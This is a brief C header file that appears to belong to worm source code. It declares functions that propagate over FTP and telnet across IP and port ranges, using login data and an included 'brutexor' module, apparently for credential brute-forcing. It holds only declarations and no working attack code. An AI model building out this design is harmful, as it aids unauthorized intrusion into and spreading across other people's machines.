#ifndef PROPAGTION_H_
#define PROPAGTION_H_

#include "brutexor.h"

int ftp_propagate(int fd, char *firstIP, int minIP, int maxIP, int min_port, int max_port);
int telnet_propagate(login l, char *IP, char *firstIP, int minIP, int maxIP, int min_port, int max_port);

#endif
